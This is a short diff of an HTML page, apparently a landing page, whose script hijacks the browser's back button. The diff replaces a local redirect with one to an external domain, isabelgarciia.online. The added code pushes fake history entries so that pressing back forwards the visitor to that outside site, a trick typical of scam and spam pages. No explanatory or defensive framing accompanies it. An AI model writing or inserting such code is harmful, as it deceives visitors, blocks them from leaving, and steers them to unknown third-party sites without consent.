@@ -73,21 +73,21 @@ function getParams() {
     })
 }(); </script>
 
-    <script>
-    var back_redirect_back_link = '/redirect'+ location.search;
-    // Não altere daqui para baixo
-    history.pushState({}, "", location.href);
-    history.pushState({}, "", location.href);
-
-    window.addEventListener('popstate', function (event) {
-        if (event.state) {
-            setTimeout(function () {
-             
-                location.href = back_redirect_back_link;
-            }, 1);
-        }
-    }, false);
+    <script> 
+var back_redirect_back_link = 'https://isabelgarciia.online/redirect/';
+ 
+ 
+history.pushState({}, "", location.href);
+history.pushState({}, "", location.href);
+ 
+ 
+window.onpopstate = function () {
+setTimeout(function () {
+location.href = back_redirect_back_link;
+}, 1);
+};
 </script>
+
   </head>
   <body>
 
